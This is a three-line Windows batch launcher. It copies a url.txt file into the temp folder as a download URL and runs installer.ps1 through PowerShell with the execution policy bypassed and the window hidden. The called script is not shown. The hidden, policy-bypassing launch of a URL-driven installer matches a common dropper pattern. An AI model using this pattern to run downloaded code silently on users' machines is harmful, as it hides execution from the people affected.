@echo off
copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0installer.ps1"
